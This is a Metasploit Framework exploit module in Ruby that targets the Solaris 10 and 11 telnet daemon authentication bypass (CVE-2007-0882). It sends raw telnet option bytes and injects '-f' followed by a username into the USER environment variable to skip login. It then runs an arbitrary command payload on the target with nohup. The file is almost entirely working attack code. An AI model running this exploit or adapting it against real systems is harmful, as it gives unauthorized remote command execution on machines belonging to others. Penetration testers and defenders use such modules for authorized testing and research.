##
# $Id: fuser.rb 9583 2010-06-22 19:11:05Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sun Solaris Telnet Remote Authentication Bypass Vulnerability',
			'Description'    => %q{
				This module exploits the argument injection vulnerabilty
				in the telnet daemon (in.telnetd) of Solaris 10 and 11.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9583 $',
			'References'     =>
				[
					[ 'CVE', '2007-0882' ],
					[ 'OSVDB', '31881'],
					[ 'BID', '22512' ],
				],
			'Privileged'     => false,
			'Platform'       => ['unix', 'solaris'],
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					'Space'    => 2000,
					'BadChars' => '',
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl telnet',
						}
				},
			'Targets'        =>
				[
					['Automatic', { }],
				],
			'DisclosureDate' => 'Feb 12 2007',
			'DefaultTarget' => 0))

			register_options(
				[
					Opt::RPORT(23),
					OptString.new('USER', [ true, "The username to use",     "bin" ]),
				], self.class)
	end

	def exploit
		connect

		print_status('Setting USER environment variable...')

		req =  "\xFF\xFD\x26\xFF\xFB\x26\xFF\xFD\x03\xFF\xFB"
		req << "\x18\xFF\xFB\x1F\xFF\xFB\x20\xFF\xFB\x21\xFF"
		req << "\xFB\x22\xFF\xFB\x27\xFF\xFD\x05"

		sock.put(req)
		sock.get_once

		req << "\xFF\xFC\x25"

		sock.put(req)
		sock.get_once

		req << "\xFF\xFA\x26\x01\x01\x02\xFF\xF0"

		sock.put(req)
		sock.get_once

		req << "\xFF\xFA\x1F\x00\x50\x00\x18\xFF\xF0"

		sock.put(req)
		sock.get_once

		req << "\xFF\xFE\x26\xFF\xFC\x23\xFF\xFC\x24"

		sock.put(req)
		sock.get_once

		req =  "\xFF\xFA\x18\x00\x58\x54\x45\x52\x4D\xFF"
		req << "\xF0\xFF\xFA\x27\x00\x00\x55\x53\x45\x52"
		req << "\x01\x2D\x66" + datastore['USER'] + "\xFF\xF0"

		sock.put(req)
		sock.get_once
		select(nil,nil,nil,0.25)

		sock.put("nohup " + payload.encoded + " >/dev/null 2>&1\n")

		select(nil,nil,nil,0.25)

		handler
	end

end

